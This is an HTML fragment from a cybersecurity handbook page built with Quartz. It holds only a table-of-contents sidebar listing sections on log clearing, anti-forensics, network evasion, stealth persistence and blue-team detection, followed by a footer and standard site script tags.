href="#6-anti-debugging--anti-vm-awareness" data-for="6-anti-debugging--anti-vm-awareness">6. Anti-Debugging &amp; Anti-VM (Awareness)</a></li><li class="depth-2"><a href="#61-why-malware-uses-them" data-for="61-why-malware-uses-them">6.1 Why Malware Uses Them</a></li><li class="depth-2"><a href="#62-common-checks-educational" data-for="62-common-checks-educational">6.2 Common Checks (Educational)</a></li><li class="depth-2"><a href="#63-red-team-reality" data-for="63-red-team-reality">6.3 Red Team Reality</a></li><li class="depth-2"><a href="#64-defender-view" data-for="64-defender-view">6.4 Defender View</a></li><li class="depth-1"><a href="#7-linux-log--artifact-clearing" data-for="7-linux-log--artifact-clearing">7. Linux Log &amp; Artifact Clearing</a></li><li class="depth-2"><a href="#71-important-logs" data-for="71-important-logs">7.1 Important Logs</a></li><li class="depth-2"><a href="#72-viewing-before-touching" data-for="72-viewing-before-touching">7.2 Viewing Before Touching</a></li><li class="depth-2"><a href="#73-clearing-approaches-authorized-only" data-for="73-clearing-approaches-authorized-only">7.3 Clearing Approaches (Authorized Only)</a></li><li class="depth-2"><a href="#74-utmp--wtmp--btmp" data-for="74-utmp--wtmp--btmp">7.4 utmp / wtmp / btmp</a></li><li class="depth-2"><a href="#75-auditd" data-for="75-auditd">7.5 auditd</a></li><li class="depth-2"><a href="#76-better-opsec-than-wiping" data-for="76-better-opsec-than-wiping">7.6 Better OPSEC Than Wiping</a></li><li class="depth-1"><a href="#8-windows-log--artifact-clearing" data-for="8-windows-log--artifact-clearing">8. Windows Log &amp; Artifact Clearing</a></li><li class="depth-2"><a href="#81-primary-event-logs" data-for="81-primary-event-logs">8.1 Primary Event Logs</a></li><li class="depth-2"><a href="#82-clearing-event-logs-requires-privilege" data-for="82-clearing-event-logs-requires-privilege">8.2 Clearing Event Logs (Requires Privilege)</a></li><li class="depth-2"><a href="#83-powershell-history" data-for="83-powershell-history">8.3 PowerShell History</a></li><li class="depth-2"><a href="#84-prefetch--shimcache--amcache" data-for="84-prefetch--shimcache--amcache">8.4 Prefetch / ShimCache / Amcache</a></li><li class="depth-2"><a href="#85-usn-journal--mft" data-for="85-usn-journal--mft">8.5 USN Journal / MFT</a></li><li class="depth-2"><a href="#86-scheduled-task--service-history" data-for="86-scheduled-task--service-history">8.6 Scheduled Task / Service History</a></li><li class="depth-1"><a href="#9-shell-history--file-cleanup" data-for="9-shell-history--file-cleanup">9. Shell History &amp; File Cleanup</a></li><li class="depth-2"><a href="#91-linux-history" data-for="91-linux-history">9.1 Linux History</a></li><li class="depth-2"><a href="#92-secure-delete-myths" data-for="92-secure-delete-myths">9.2 Secure Delete Myths</a></li><li class="depth-2"><a href="#93-temp-file-hygiene" data-for="93-temp-file-hygiene">9.3 Temp File Hygiene</a></li><li class="depth-2"><a href="#94-timestomping" data-for="94-timestomping">9.4 Timestomping</a></li><li class="depth-2"><a href="#95-prefer-non-persistence" data-for="95-prefer-non-persistence">9.5 Prefer Non-Persistence</a></li><li class="depth-1"><a href="#10-network-evasion" data-for="10-network-evasion">10. Network Evasion</a></li><li class="depth-2"><a href="#101-port--protocol-choices" data-for="101-port--protocol-choices">10.1 Port &amp; Protocol Choices</a></li><li class="depth-2"><a href="#102-domain-fronting--cdn--redirectors" data-for="102-domain-fronting--cdn--redirectors">10.2 Domain Fronting / CDN / Redirectors</a></li><li class="depth-2"><a href="#103-dns-tunneling-concept" data-for="103-dns-tunneling-concept">10.3 DNS Tunneling (Concept)</a></li><li class="depth-2"><a href="#104-proxy-aware-payloads" data-for="104-proxy-aware-payloads">10.4 Proxy-Aware Payloads</a></li><li class="depth-2"><a href="#105-ssh--socks-pivoting" data-for="105-ssh--socks-pivoting">10.5 SSH / SOCKS Pivoting</a></li><li class="depth-2"><a href="#106-traffic-padding--jitter" data-for="106-traffic-padding--jitter">10.6 Traffic Padding &amp; Jitter</a></li><li class="depth-2"><a href="#107-host-firewall-stealth" data-for="107-host-firewall-stealth">10.7 Host Firewall Stealth</a></li><li class="depth-1"><a href="#11-stealth-persistence-patterns" data-for="11-stealth-persistence-patterns">11. Stealth Persistence Patterns</a></li><li class="depth-2"><a href="#111-linux-systemd-timers" data-for="111-linux-systemd-timers">11.1 Linux: systemd Timers</a></li><li class="depth-2"><a href="#112-linux-cron-disguise" data-for="112-linux-cron-disguise">11.2 Linux: Cron Disguise</a></li><li class="depth-2"><a href="#113-windows-wmi-event-subscriptions" data-for="113-windows-wmi-event-subscriptions">11.3 Windows: WMI Event Subscriptions</a></li><li class="depth-2"><a href="#114-windows-disguised-scheduled-tasks" data-for="114-windows-disguised-scheduled-tasks">11.4 Windows: Disguised Scheduled Tasks</a></li><li class="depth-2"><a href="#115-dll-sideload-persistence" data-for="115-dll-sideload-persistence">11.5 DLL Sideload Persistence</a></li><li class="depth-2"><a href="#116-cloud-persistence-related-to-file-06" data-for="116-cloud-persistence-related-to-file-06">11.6 Cloud Persistence (Related to File 06)</a></li><li class="depth-1"><a href="#12-forensic-awareness--anti-forensics" data-for="12-forensic-awareness--anti-forensics">12. Forensic Awareness &amp; Anti-Forensics</a></li><li class="depth-2"><a href="#121-what-ir-will-look-at" data-for="121-what-ir-will-look-at">12.1 What IR Will Look At</a></li><li class="depth-2"><a href="#122-anti-forensics-categories" data-for="122-anti-forensics-categories">12.2 Anti-Forensics Categories</a></li><li class="depth-2"><a href="#123-memory-vs-disk" data-for="123-memory-vs-disk">12.3 Memory vs Disk</a></li><li class="depth-2"><a href="#124-report-friendly-language" data-for="124-report-friendly-language">12.4 Report-Friendly Language</a></li><li class="depth-1"><a href="#13-blue-team-detection-opportunities" data-for="13-blue-team-detection-opportunities">13. Blue Team Detection Opportunities</a></li><li class="depth-2"><a href="#131-high-fidelity-alerts" data-for="131-high-fidelity-alerts">13.1 High-Fidelity Alerts</a></li><li class="depth-2"><a href="#132-hardening-that-beats-cleverness" data-for="132-hardening-that-beats-cleverness">13.2 Hardening That Beats Cleverness</a></li><li class="depth-2"><a href="#133-purple-team-loop" data-for="133-purple-team-loop">13.3 Purple Team Loop</a></li><li class="depth-1"><a href="#14-references" data-for="14-references">14. References</a></li><li class="depth-1"><a href="#appendix-a-opsec-checklist-red" data-for="appendix-a-opsec-checklist-red">Appendix A: OPSEC Checklist (Red)</a></li><li class="depth-1"><a href="#appendix-b-ir-checklist-blue" data-for="appendix-b-ir-checklist-blue">Appendix B: IR Checklist (Blue)</a></li><li class="depth-1"><a href="#appendix-c-quiet-vs-loud-actions" data-for="appendix-c-quiet-vs-loud-actions">Appendix C: “Quiet” vs “Loud” Actions</a></li><li class="depth-1"><a href="#appendix-d-legal-reminder" data-for="appendix-d-legal-reminder">Appendix D: Legal Reminder</a></li><li class="depth-1"><a href="#handbook-index" data-for="handbook-index">Handbook Index</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v5.0.0</a> © 2026</p><ul><li><a href="https://github.com/priyanshu-rawa/Cybersecurity-Handbook">GitHub</a></li><li><a href="https://linkedin.com/in/priyanshurawat9111">LinkedIn</a></li></ul></footer></div></div></body><script src="../static/resource-after-e13fffa1.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-8b336f9a.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-baba652b.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-5eb75950.js" type="module" data-persist="true"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript" data-persist="true"></script><script src="../postscript-cd8794c3.js" type="module" data-persist="true"></script></html>
